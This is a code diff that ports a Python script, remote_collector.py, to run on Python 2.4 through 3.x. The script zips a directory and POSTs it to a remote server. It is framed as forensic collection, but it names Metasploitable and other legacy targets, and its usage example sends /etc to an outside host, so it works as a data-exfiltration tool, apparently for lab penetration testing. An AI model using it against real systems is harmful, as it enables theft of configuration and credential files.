@@ -1,58 +1,150 @@
+#!/usr/bin/env python
+# -*- coding: utf-8 -*-
+"""
+remote_collector.py - Collect, zip, and send forensic evidence to a central server.
+Compatible with Python 2.4, 2.5, 2.6, 2.7 and Python 3.x.
+Tested on legacy targets (e.g. Metasploitable 2 / Ubuntu 8.04) and modern systems.
+"""
+
 import os
-import argparse
-import shutil
-import urllib.request
+import sys
 import tempfile
 import socket
+import zipfile
+import shutil
+
+# Cross-version urllib import (Python 2 vs Python 3)
+try:
+    import urllib.request as urllib2
+except ImportError:
+    import urllib2
+
+# Compression mode fallback (zlib optional)
+try:
+    import zlib
+    COMPRESSION = zipfile.ZIP_DEFLATED
+except ImportError:
+    COMPRESSION = zipfile.ZIP_STORED
+
+
+def create_zip_archive(target_dir, output_zip_path):
+    """Recursively archive target_dir into output_zip_path without shutil.make_archive or os.path.relpath."""
+    target_dir = os.path.abspath(target_dir)
+    zf = zipfile.ZipFile(output_zip_path, 'w', COMPRESSION)
+    try:
+        for root, dirs, files in os.walk(target_dir):
+            for filename in files:
+                filepath = os.path.join(root, filename)
+                # Compute relative path safely across Python 2.4 - 3.x
+                if filepath.startswith(target_dir):
+                    rel_path = filepath[len(target_dir):].lstrip('/\\')
+                else:
+                    rel_path = filename
+                
+                try:
+                    zf.write(filepath, rel_path)
+                except Exception:
+                    err = sys.exc_info()[1]
+                    # Print warning for inaccessible files (e.g. permission denied) and continue
+                    print("[-] Warning: Skipping %s (%s)" % (filepath, err))
+    finally:
+        zf.close()
+
 
 def pack_and_send(target_dir, server_url):
     if not os.path.exists(target_dir):
-        print(f"[-] Error: Target directory '{target_dir}' does not exist.")
-        return
+        print("[-] Error: Target directory '%s' does not exist." % (target_dir,))
+        return False
 
-    print(f"[*] Packing directory: {target_dir}")
+    print("[*] Packing directory: %s" % (target_dir,))
     
     temp_dir = tempfile.mkdtemp()
-    base_name = os.path.join(temp_dir, "evidence")
-    archive_path = ""
+    archive_path = os.path.join(temp_dir, "evidence.zip")
     
     try:
-        archive_path = shutil.make_archive(base_name, 'zip', target_dir)
-        print(f"[+] Successfully packed into {archive_path}")
+        create_zip_archive(target_dir, archive_path)
+        print("[+] Successfully packed into %s" % (archive_path,))
         
         file_size = os.path.getsize(archive_path)
-        print(f"[*] Connecting to {server_url} to send {file_size} bytes...")
+        print("[*] Connecting to %s to send %d bytes..." % (server_url, file_size))
 
-        hostname = socket.gethostname()
-        filename = f"{hostname}_evidence.zip"
+        try:
+            hostname = socket.gethostname()
+        except Exception:
+            hostname = "unknown_host"
 
-        with open(archive_path, 'rb') as f:
-            req = urllib.request.Request(server_url, data=f, method='POST')
-            req.add_header('Content-Length', str(file_size))
-            req.add_header('X-Filename', filename)
-            req.add_header('Content-Type', 'application/zip')
+        filename = "%s_evidence.zip" % (hostname,)
 
+        # Read archive data in binary mode (compatible with Python 2 & 3)
+        f = open(archive_path, 'rb')
+        try:
+            payload = f.read()
+        finally:
+            f.close()
+
+        headers = {
+            'Content-Type': 'application/zip',
+            'Content-Length': str(len(payload)),
+            'X-Filename': filename
+        }
+
+        # urllib2.Request(url, data, headers) sends a POST request in both Python 2 and 3
+        req = urllib2.Request(server_url, payload, headers)
+
+        try:
+            response = urllib2.urlopen(req)
             try:
-                with urllib.request.urlopen(req) as response:
+                if hasattr(response, 'getcode'):
                     status_code = response.getcode()
-                    resp_body = response.read().decode()
-                    if status_code == 200:
-                        print(f"[+] Successfully sent evidence to central server. Server says: {resp_body.strip()}")
-                    else:
-                        print(f"[-] Failed to send. Server returned status {status_code}: {resp_body}")
-            except Exception as e:
-                print(f"[-] Error connecting to server: {e}")
+                else:
+                    status_code = getattr(response, 'code', 200)
+
+                resp_body = response.read()
+                if hasattr(resp_body, 'decode'):
+                    resp_body = resp_body.decode('utf-8', 'replace')
+
+                if status_code == 200:
+                    print("[+] Successfully sent evidence to central server. Server says: %s" % (resp_body.strip(),))
+                    return True
+                else:
+                    print("[-] Failed to send. Server returned status %s: %s" % (status_code, resp_body))
+                    return False
+            finally:
+                response.close()
+        except Exception:
+            err = sys.exc_info()[1]
+            print("[-] Error connecting to server: %s" % (err,))
+            return False
 
     finally:
         print("[*] Cleaning up temporary files...")
         if os.path.exists(temp_dir):
-            shutil.rmtree(temp_dir)
+            try:
+                shutil.rmtree(temp_dir)
+            except Exception:
+                pass
         print("[*] Done.")
 
+
+def print_usage():
+    print("Usage: python remote_collector.py <target_dir> <server_url>")
+    print("Example: python remote_collector.py /etc http://192.168.1.10:8000/")
+    print("")
+    print("Note for Metasploitable / Legacy Linux:")
+    print("  Run with 'python' (Python 2.5+), no external dependencies required.")
+
+
 if __name__ == '__main__':
-    parser = argparse.ArgumentParser(description="Collect, zip, and send forensic data to a central server.")
-    parser.add_argument('target_dir', help="Directory to collect and pack")
-    parser.add_argument('server_url', help="URL of the central server (e.g. http://192.168.1.10:8000/)")
+    if len(sys.argv) < 3:
+        if len(sys.argv) == 2 and sys.argv[1] in ('-h', '--help', 'help'):
+            print_usage()
+            sys.exit(0)
+        print("[-] Error: Missing arguments.")
+        print_usage()
+        sys.exit(1)
+
+    target_dir = sys.argv[1]
+    server_url = sys.argv[2]
     
-    args = parser.parse_args()
-    pack_and_send(args.target_dir, args.server_url)
+    pack_and_send(target_dir, server_url)
+
